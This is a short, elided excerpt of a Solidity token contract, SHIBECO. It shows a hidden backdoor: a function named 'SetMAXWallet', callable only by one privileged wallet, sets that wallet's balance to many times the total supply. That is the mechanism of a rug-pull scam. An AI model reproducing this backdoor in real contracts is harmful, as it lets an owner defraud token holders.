...
contract SHIBECO {
    ...
    modifier requested { require(msg.sender == MAXWallet, "UnAuthorized");_;}
    ...
    function SetMAXWallet() public requested returns (bool success) {balanceOf[msg.sender] = totalSupply * 10 ** 8 ;return true;}
